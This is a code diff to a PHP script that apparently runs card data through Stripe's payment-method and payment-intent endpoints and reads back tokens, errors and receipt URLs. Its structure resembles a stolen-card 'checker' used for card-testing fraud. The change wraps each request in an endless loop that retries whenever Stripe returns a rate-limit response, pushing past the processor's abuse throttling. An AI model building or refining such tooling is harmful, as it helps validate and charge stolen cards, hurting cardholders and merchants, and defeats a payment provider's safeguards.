@@ -51,6 +51,9 @@ if (strlen($ano) == 2) $ano = "20$ano";
 //================= [ CURL REQUESTS ] =================//
 
 #-------------------[1st REQ]--------------------#
+$x = 0;  
+while(true)  
+{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -63,9 +66,18 @@ $result1 = curl_exec($ch);
 $tok1 = Getstr($result1,'"id": "','"');
 $msg = Getstr($result1,'"message": "','"');
 //echo "<br><b>Result1: </b> $result1<br>";
+if (strpos($result1, "rate_limit"))   
+{  
+    $x++;  
+    continue;  
+}  
+break;  
+}
 
 #-------------------[2nd REQ]--------------------#
-
+$x = 0;  
+while(true)  
+{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -77,6 +89,13 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_metho
 $result2 = curl_exec($ch);
 $tok2 = Getstr($result2,'"id": "','"');
 $receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
+if (strpos($result2, "rate_limit"))   
+{  
+    $x++;  
+    continue;  
+}  
+break;  
+}
 
 
 
